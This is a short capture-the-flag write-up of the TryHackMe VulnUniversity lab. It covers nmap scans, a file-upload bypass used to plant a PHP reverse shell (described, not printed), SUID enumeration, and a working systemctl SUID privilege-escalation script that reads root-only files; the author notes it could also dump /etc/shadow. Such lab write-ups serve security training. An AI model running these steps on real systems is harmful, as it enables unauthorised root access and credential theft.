### THM VulnUniversity

Here we are again.  Back for another Linux box.  These all seem a little faster than the Windows ones.  Off we go.

```
(kali@kali)-$ sudo nmap -T4 -p- -Pn 10.10.120.147   
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 18:06 EST
Nmap scan report for 10.10.120.147
Host is up (0.11s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes

Nmap done: 1 IP address (1 host up) scanned in 266.79 seconds
```

Got a couple ports to work with, take a deeper look at those.

```
(kali@kali)-$ sudo nmap -A -Pn -p 21,22,139,445,3128,3333 10.10.120.147
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 18:13 EST
Nmap scan report for 10.10.120.147
Host is up (0.11s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-11-11T23:13:39
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-11-11T18:13:39-05:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   39.03 ms  10.6.0.1
2   ... 3
4   106.11 ms 10.10.120.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.37 seconds
```

So we do have some stuff to work with.  Since I'm on a bit of a time crunch, just going to write about how I got privilege escalation and the script that I used.

Checked FTP and SMB, didn't see anything of note.  Checked the webserver on 3333 with dirbuster and came back with the `/internal` directory.  Check that and it's a file upload page.

Enumerate that and find out that .phtml files can be uploaded.  Here we used Burpe Suite.  Then I went and found a php reverse shell to upload from pentestmonkey.

Uploaded that after chaning the needed items.  Started a netcat listener and navigated to the uploaded page and got my reverse shell.

Now that we're here, we do our normal enumeration.  One of the commands that we would run is...

`find / -perm -u=s -type f 2> /dev/null`

This will spit out a number of items to check the SUID against in GTFObins.

```
$ find / -perm -u=s -type f 2> /dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl   # This is the one we're looking for
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

Check that again GTFObins and we get this...

![GTFObins](/Images/THM3VulnUniversity/pic1.png)

Take that and we copy and paste the first line and run it in the cmd line window.  Then, we're gonna modify the rest of the script and put it in line by line.

```
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

We changed the command that we wanted to run to cat out the root.txt file and put it into the /tmp/output file.  We also did full paths for the systemctl instead of the ./.

```
$ sudo install -m =xs $(which systemctl) .
sudo: no tty present and no askpass program specified
$ TF=$(mktemp).service
$ echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.G7BEVD3MNG.service to /tmp/tmp.G7BEVD3MNG.service.
$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.G7BEVD3MNG.service to /tmp/tmp.G7BEVD3MNG.service.
```

Once that's done, we cat out the /tmp/output file and there we have it, a root flag.

![root flag](/Images/THM3VulnUniversity/pic2.png)

We can change that command to whatever we want really.  Here we just had it cat out a file and drop it into another file, but we could have used this to dump the /etc/shadow file as well.

Thanks for coming along, sorry this one was so short.  Got lots to get through yet still and not much time before I start my PNPT quest.  Thanks again for coming along.




